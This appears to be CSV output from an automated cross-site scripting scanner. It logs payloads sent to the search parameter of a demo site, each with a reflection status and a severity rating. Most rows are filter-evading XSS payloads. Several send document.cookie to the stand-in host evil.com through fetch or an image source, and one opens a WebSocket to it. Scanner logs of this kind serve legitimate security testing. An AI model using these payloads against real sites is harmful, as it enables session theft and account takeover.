+2026-01-10 17:01:07.529,2026-01-10 17:01:07.663,0.133,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowsdelete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.551,2026-01-10 17:01:07.665,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:06.809,2026-01-10 17:01:07.715,0.906,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragstart=alert(1)>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:07.653,2026-01-10 17:01:07.781,0.128,https://demo-knsl.onrender.com/search,GET,q,javascript:alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.653,2026-01-10 17:01:07.781,0.129,https://demo-knsl.onrender.com/search,GET,q,<img src=x onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.665,2026-01-10 17:01:07.805,0.141,https://demo-knsl.onrender.com/search,GET,q,"data:text/html,<script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.657,2026-01-10 17:01:07.806,0.149,https://demo-knsl.onrender.com/search,GET,q,javascript:alert('XSS'),RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.663,2026-01-10 17:01:07.809,0.147,https://demo-knsl.onrender.com/search,GET,q,javascript:confirm(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.661,2026-01-10 17:01:07.810,0.148,https://demo-knsl.onrender.com/search,GET,q,javascript:prompt(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.715,2026-01-10 17:01:07.828,0.114,https://demo-knsl.onrender.com/search,GET,q,"data:text/html,<img src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.781,2026-01-10 17:01:07.890,0.109,https://demo-knsl.onrender.com/search,GET,q,<q/oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.781,2026-01-10 17:01:07.903,0.121,https://demo-knsl.onrender.com/search,GET,q,<q/onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.809,2026-01-10 17:01:07.924,0.114,https://demo-knsl.onrender.com/search,GET,q,<q/onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.805,2026-01-10 17:01:07.924,0.118,https://demo-knsl.onrender.com/search,GET,q,<q/ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.806,2026-01-10 17:01:07.927,0.121,https://demo-knsl.onrender.com/search,GET,q,<q/ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.810,2026-01-10 17:01:07.935,0.125,https://demo-knsl.onrender.com/search,GET,q,<q/onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.828,2026-01-10 17:01:07.938,0.110,https://demo-knsl.onrender.com/search,GET,q,<q/oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.890,2026-01-10 17:01:08.011,0.121,https://demo-knsl.onrender.com/search,GET,q,<q/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.903,2026-01-10 17:01:08.019,0.116,https://demo-knsl.onrender.com/search,GET,q,<q/onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.924,2026-01-10 17:01:08.039,0.116,https://demo-knsl.onrender.com/search,GET,q,<q/onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.927,2026-01-10 17:01:08.039,0.112,https://demo-knsl.onrender.com/search,GET,q,<q/onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.924,2026-01-10 17:01:08.042,0.119,https://demo-knsl.onrender.com/search,GET,q,<q/onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.935,2026-01-10 17:01:08.043,0.108,https://demo-knsl.onrender.com/search,GET,q,<q/onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.938,2026-01-10 17:01:08.046,0.108,https://demo-knsl.onrender.com/search,GET,q,<q/onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.011,2026-01-10 17:01:08.122,0.111,https://demo-knsl.onrender.com/search,GET,q,<q/onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.019,2026-01-10 17:01:08.122,0.103,https://demo-knsl.onrender.com/search,GET,q,<q/onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.043,2026-01-10 17:01:08.161,0.118,https://demo-knsl.onrender.com/search,GET,q,<svg onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.039,2026-01-10 17:01:08.161,0.122,https://demo-knsl.onrender.com/search,GET,q,<q/onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.039,2026-01-10 17:01:08.164,0.125,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.046,2026-01-10 17:01:08.164,0.118,https://demo-knsl.onrender.com/search,GET,q,<body onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.042,2026-01-10 17:01:08.168,0.125,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.122,2026-01-10 17:01:08.241,0.119,https://demo-knsl.onrender.com/search,GET,q,<script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.122,2026-01-10 17:01:08.241,0.118,https://demo-knsl.onrender.com/search,GET,q,alert(1),RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.161,2026-01-10 17:01:08.283,0.122,https://demo-knsl.onrender.com/search,GET,q,</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.161,2026-01-10 17:01:08.284,0.123,https://demo-knsl.onrender.com/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.164,2026-01-10 17:01:08.286,0.122,https://demo-knsl.onrender.com/search,GET,q,onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.164,2026-01-10 17:01:08.287,0.123,https://demo-knsl.onrender.com/search,GET,q,<svg,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.168,2026-01-10 17:01:08.289,0.121,https://demo-knsl.onrender.com/search,GET,q,<ScRiPt>alert(1)</ScRiPt>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.241,2026-01-10 17:01:08.379,0.139,https://demo-knsl.onrender.com/search,GET,q,<sCrIpT>alert(1)</sCrIpT>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.241,2026-01-10 17:01:08.379,0.139,https://demo-knsl.onrender.com/search,GET,q,<SCRIPT>alert(1)</SCRIPT>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.532,2026-01-10 17:01:08.397,0.865,https://demo-knsl.onrender.com/search,GET,q,<img src=x onscroll=alert(1)>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:07.540,2026-01-10 17:01:08.433,0.894,https://demo-knsl.onrender.com/search,GET,q,<img src=x onstart=alert(1)>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:08.289,2026-01-10 17:01:08.453,0.164,https://demo-knsl.onrender.com/search,GET,q,< script >alert(1)< / script >,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.287,2026-01-10 17:01:08.454,0.167,https://demo-knsl.onrender.com/search,GET,q,<SvG oNlOaD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.283,2026-01-10 17:01:08.457,0.174,https://demo-knsl.onrender.com/search,GET,q,<IMG SRC=x ONERROR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.379,2026-01-10 17:01:08.504,0.125,https://demo-knsl.onrender.com/search,GET,q,< svg onload=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.379,2026-01-10 17:01:08.504,0.125,https://demo-knsl.onrender.com/search,GET,q,< img src=x onerror=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.397,2026-01-10 17:01:08.506,0.109,https://demo-knsl.onrender.com/search,GET,q,<scr<script>ipt>alert(1)</scr</script>ipt>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:07.653,2026-01-10 17:01:08.529,0.876,https://demo-knsl.onrender.com/search,GET,q,<img src=x onunload=alert(1)>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:08.433,2026-01-10 17:01:08.588,0.154,https://demo-knsl.onrender.com/search,GET,q,<<script>script>alert(1)<</script>/script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.454,2026-01-10 17:01:08.588,0.135,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.457,2026-01-10 17:01:08.592,0.135,https://demo-knsl.onrender.com/search,GET,q,<svg//onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.286,2026-01-10 17:01:08.600,0.314,https://demo-knsl.onrender.com/search,GET,q,<SVG ONLOAD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.506,2026-01-10 17:01:08.612,0.106,https://demo-knsl.onrender.com/search,GET,q,%3Csvg%20onload=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.504,2026-01-10 17:01:08.612,0.109,https://demo-knsl.onrender.com/search,GET,q,%3Cscript%3Ealert(1)%3C/script%3E,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.504,2026-01-10 17:01:08.622,0.118,https://demo-knsl.onrender.com/search,GET,q,%3Cimg%20src=x%20onerror=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.529,2026-01-10 17:01:08.638,0.110,https://demo-knsl.onrender.com/search,GET,q,<script>alert`1`</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.588,2026-01-10 17:01:08.689,0.101,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.600,2026-01-10 17:01:08.703,0.103,https://demo-knsl.onrender.com/search,GET,q,<script><!---->alert(1)<!----></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.284,2026-01-10 17:01:08.706,0.422,https://demo-knsl.onrender.com/search,GET,q,<ImG sRc=x OnErRoR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.588,2026-01-10 17:01:08.706,0.118,https://demo-knsl.onrender.com/search,GET,q,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.612,2026-01-10 17:01:08.720,0.107,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=/**/alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.622,2026-01-10 17:01:08.732,0.110,https://demo-knsl.onrender.com/search,GET,q,"<script>eval(""alert(1)"")</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.612,2026-01-10 17:01:08.732,0.120,https://demo-knsl.onrender.com/search,GET,q,<script>eval('alert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.638,2026-01-10 17:01:08.769,0.131,https://demo-knsl.onrender.com/search,GET,q,<script>eval(atob('YWxlcnQoMSk='))</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.703,2026-01-10 17:01:08.807,0.104,https://demo-knsl.onrender.com/search,GET,q,<svg onload=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.706,2026-01-10 17:01:08.807,0.102,https://demo-knsl.onrender.com/search,GET,q,<script>Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.592,2026-01-10 17:01:08.813,0.221,https://demo-knsl.onrender.com/search,GET,q,<script>/**/alert(1)/**/</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.706,2026-01-10 17:01:08.826,0.120,https://demo-knsl.onrender.com/search,GET,q,<script>new Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.720,2026-01-10 17:01:08.838,0.119,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=Function('alert(1)')()>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.732,2026-01-10 17:01:08.840,0.109,https://demo-knsl.onrender.com/search,GET,q,"<script>setTimeout('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.732,2026-01-10 17:01:08.841,0.109,https://demo-knsl.onrender.com/search,GET,q,"<script>setTimeout(""alert(1)"",0)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.769,2026-01-10 17:01:08.865,0.096,https://demo-knsl.onrender.com/search,GET,q,"<script>setInterval('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.453,2026-01-10 17:01:08.895,0.442,https://demo-knsl.onrender.com/search,GET,q,"<img src=""x""onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.807,2026-01-10 17:01:08.930,0.122,https://demo-knsl.onrender.com/search,GET,q,"<img src=x onerror=setTimeout('alert(1)',0)>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.808,2026-01-10 17:01:08.930,0.123,https://demo-knsl.onrender.com/search,GET,q,<script>location='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.826,2026-01-10 17:01:08.935,0.109,https://demo-knsl.onrender.com/search,GET,q,"<script>location=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,49,41)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.841,2026-01-10 17:01:08.954,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=\u0061lert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.838,2026-01-10 17:01:08.954,0.115,https://demo-knsl.onrender.com/search,GET,q,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.865,2026-01-10 17:01:08.974,0.109,https://demo-knsl.onrender.com/search,GET,q,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.895,2026-01-10 17:01:09.010,0.115,https://demo-knsl.onrender.com/search,GET,q,<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.930,2026-01-10 17:01:09.034,0.104,https://demo-knsl.onrender.com/search,GET,q,"<script>alert(String.fromCharCode(88,83,83))</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.930,2026-01-10 17:01:09.037,0.107,https://demo-knsl.onrender.com/search,GET,q,"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.935,2026-01-10 17:01:09.037,0.102,https://demo-knsl.onrender.com/search,GET,q,<script>document.write('<img src=x onerror=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.813,2026-01-10 17:01:09.045,0.232,https://demo-knsl.onrender.com/search,GET,q,<script>location.href='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.954,2026-01-10 17:01:09.146,0.192,https://demo-knsl.onrender.com/search,GET,q,<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.954,2026-01-10 17:01:09.146,0.193,https://demo-knsl.onrender.com/search,GET,q,<script>document.write('<svg onload=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.689,2026-01-10 17:01:09.147,0.458,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.974,2026-01-10 17:01:09.147,0.173,https://demo-knsl.onrender.com/search,GET,q,<a href=javascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:08.840,2026-01-10 17:01:09.161,0.320,https://demo-knsl.onrender.com/search,GET,q,<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.034,2026-01-10 17:01:09.201,0.167,https://demo-knsl.onrender.com/search,GET,q,<a href='javascript:alert(1)'>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.010,2026-01-10 17:01:09.201,0.192,https://demo-knsl.onrender.com/search,GET,q,"<a href=""javascript:alert(1)"">X</a>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.037,2026-01-10 17:01:09.201,0.164,https://demo-knsl.onrender.com/search,GET,q,<a href=j&#97vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.045,2026-01-10 17:01:09.218,0.173,https://demo-knsl.onrender.com/search,GET,q,<form><button formaction=javascript:alert(1)>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.147,2026-01-10 17:01:09.267,0.120,https://demo-knsl.onrender.com/search,GET,q,<base href=javascript:alert(1)//>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.146,2026-01-10 17:01:09.303,0.157,https://demo-knsl.onrender.com/search,GET,q,<form><input type=submit formaction=javascript:alert(1) value=X></form>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.201,2026-01-10 17:01:09.311,0.110,https://demo-knsl.onrender.com/search,GET,q,<div contenteditable onblur=alert(1)>test</div>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:09.161,2026-01-10 17:01:09.313,0.152,https://demo-knsl.onrender.com/search,GET,q,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.201,2026-01-10 17:01:09.328,0.127,https://demo-knsl.onrender.com/search,GET,q,<div id=x tabindex=1 onactivate=alert(1)></div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.201,2026-01-10 17:01:09.333,0.131,https://demo-knsl.onrender.com/search,GET,q,<div draggable=true ondrag=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.218,2026-01-10 17:01:09.344,0.127,https://demo-knsl.onrender.com/search,GET,q,<svg><animate onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.303,2026-01-10 17:01:09.388,0.085,https://demo-knsl.onrender.com/search,GET,q,<svg><animatemotion onbegin=alert(1)>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:09.267,2026-01-10 17:01:09.397,0.130,https://demo-knsl.onrender.com/search,GET,q,<svg><set onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.328,2026-01-10 17:01:09.398,0.070,https://demo-knsl.onrender.com/search,GET,q,<math><maction actiontype=toggle onclick=alert(1)>X</maction></math>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:09.313,2026-01-10 17:01:09.420,0.107,https://demo-knsl.onrender.com/search,GET,q,<svg><discard onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.311,2026-01-10 17:01:09.422,0.111,https://demo-knsl.onrender.com/search,GET,q,<svg><animatetransform onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.147,2026-01-10 17:01:09.440,0.293,https://demo-knsl.onrender.com/search,GET,q,"<script>import('data:text/javascript,alert(1)')</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.333,2026-01-10 17:01:09.441,0.108,https://demo-knsl.onrender.com/search,GET,q,"<iframe srcdoc=""<img src=x onerror=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.344,2026-01-10 17:01:09.442,0.098,https://demo-knsl.onrender.com/search,GET,q,"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.398,2026-01-10 17:01:09.526,0.127,https://demo-knsl.onrender.com/search,GET,q,<form name=alert><input type=submit onclick=alert(1)></form>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.388,2026-01-10 17:01:09.526,0.138,https://demo-knsl.onrender.com/search,GET,q,"<iframe srcdoc=""<svg onload=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.420,2026-01-10 17:01:09.530,0.110,https://demo-knsl.onrender.com/search,GET,q,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.422,2026-01-10 17:01:09.534,0.112,https://demo-knsl.onrender.com/search,GET,q,<script>fetch('http://evil.com?c='+document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.440,2026-01-10 17:01:09.582,0.142,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=this.src='http://evil.com?c='+document.cookie>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.441,2026-01-10 17:01:09.583,0.142,https://demo-knsl.onrender.com/search,GET,q,<svg onload=fetch('http://evil.com?c='+document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.442,2026-01-10 17:01:09.586,0.143,https://demo-knsl.onrender.com/search,GET,q,<script>document.body.innerHTML+=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.534,2026-01-10 17:01:09.668,0.134,https://demo-knsl.onrender.com/search,GET,q,<body/onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.530,2026-01-10 17:01:09.668,0.138,https://demo-knsl.onrender.com/search,GET,q,<body/onpopstate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.526,2026-01-10 17:01:09.671,0.146,https://demo-knsl.onrender.com/search,GET,q,<script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.526,2026-01-10 17:01:09.671,0.146,https://demo-knsl.onrender.com/search,GET,q,<body/onhashchange=alert(1)><a href=#x>clickme</a>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.582,2026-01-10 17:01:09.697,0.115,https://demo-knsl.onrender.com/search,GET,q,<body/onpagehide=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.583,2026-01-10 17:01:09.697,0.114,https://demo-knsl.onrender.com/search,GET,q,<body/onstorage=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.586,2026-01-10 17:01:09.707,0.121,https://demo-knsl.onrender.com/search,GET,q,<script>new WebSocket('ws://evil.com').onopen=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.671,2026-01-10 17:01:09.776,0.104,https://demo-knsl.onrender.com/search,GET,q,﻿<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.668,2026-01-10 17:01:09.776,0.108,https://demo-knsl.onrender.com/search,GET,q,<script><![CDATA[alert(1)]]></script>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.671,2026-01-10 17:01:09.782,0.111,https://demo-knsl.onrender.com/search,GET,q,"<?xml-stylesheet type=""text/xsl"" href=""javascript:alert(1)""?>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.668,2026-01-10 17:01:09.784,0.116,https://demo-knsl.onrender.com/search,GET,q,"<?xml version=""1.0""?><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.037,2026-01-10 17:01:09.869,0.833,https://demo-knsl.onrender.com/search,GET,q,<a href=j&#x61vascript:alert(1)>X</a>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:09.697,2026-01-10 17:01:09.893,0.196,https://demo-knsl.onrender.com/search,GET,q,<track src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.697,2026-01-10 17:01:09.893,0.196,https://demo-knsl.onrender.com/search,GET,q,<source src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.776,2026-01-10 17:01:09.904,0.128,https://demo-knsl.onrender.com/search,GET,q,<use href=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.784,2026-01-10 17:01:09.904,0.121,https://demo-knsl.onrender.com/search,GET,q,<select autofocus onfocus=alert(1)></select>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.782,2026-01-10 17:01:09.907,0.125,https://demo-knsl.onrender.com/search,GET,q,<textarea autofocus onfocus=alert(1)></textarea>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.776,2026-01-10 17:01:09.929,0.153,https://demo-knsl.onrender.com/search,GET,q,<input autofocus onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.146,2026-01-10 17:01:09.950,0.804,https://demo-knsl.onrender.com/search,GET,q,<form><input formaction=javascript:alert(1) type=submit value=X></form>,RAW_REFLECTION,No,,High
+2026-01-10 17:01:09.869,2026-01-10 17:01:09.958,0.088,https://demo-knsl.onrender.com/search,GET,q,<button autofocus onfocus=alert(1)>X</button>,NO_REFLECTION,No,,Info
+2026-01-10 17:01:09.893,2026-01-10 17:01:10.045,0.152,https://demo-knsl.onrender.com/search,GET,q,<div onpointerdown=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.907,2026-01-10 17:01:10.045,0.138,https://demo-knsl.onrender.com/search,GET,q,<div onpointerleave=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.904,2026-01-10 17:01:10.049,0.145,https://demo-knsl.onrender.com/search,GET,q,<div onpointerenter=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.893,2026-01-10 17:01:10.052,0.158,https://demo-knsl.onrender.com/search,GET,q,<div onpointerup=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.929,2026-01-10 17:01:10.053,0.125,https://demo-knsl.onrender.com/search,GET,q,<div onpointermove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.950,2026-01-10 17:01:10.055,0.105,https://demo-knsl.onrender.com/search,GET,q,<div ontouchstart=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.958,2026-01-10 17:01:10.068,0.110,https://demo-knsl.onrender.com/search,GET,q,<div ontouchend=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.049,2026-01-10 17:01:10.152,0.103,https://demo-knsl.onrender.com/search,GET,q,"<div style=""animation:spin 1s"" onanimationend=alert(1)>X</div>",NO_REFLECTION,No,,Info
+2026-01-10 17:01:10.045,2026-01-10 17:01:10.152,0.107,https://demo-knsl.onrender.com/search,GET,q,"<div style=""animation:spin 1s"" onanimationstart=alert(1)>X</div>",NO_REFLECTION,No,,Info
+2026-01-10 17:01:10.053,2026-01-10 17:01:10.153,0.100,https://demo-knsl.onrender.com/search,GET,q,"<div style=""transition:all 1s"" ontransitionend=alert(1)>X</div>",NO_REFLECTION,No,,Info
+2026-01-10 17:01:10.052,2026-01-10 17:01:10.153,0.101,https://demo-knsl.onrender.com/search,GET,q,"<div style=""animation:spin 1s"" onanimationiteration=alert(1)>X</div>",NO_REFLECTION,No,,Info
+2026-01-10 17:01:10.045,2026-01-10 17:01:10.190,0.145,https://demo-knsl.onrender.com/search,GET,q,<div ontouchmove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.068,2026-01-10 17:01:10.191,0.123,https://demo-knsl.onrender.com/search,GET,q,<input accesskey=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.055,2026-01-10 17:01:10.194,0.139,https://demo-knsl.onrender.com/search,GET,q,<div data-x=x onclick=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:09.707,2026-01-10 17:01:10.195,0.488,https://demo-knsl.onrender.com/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
+2026-01-10 17:01:10.152,2026-01-10 17:01:10.223,0.071,https://demo-knsl.onrender.com/search,GET,q,<div contenteditable oninput=alert(1)>X</div>,NO_REFLECTION,No,,Info
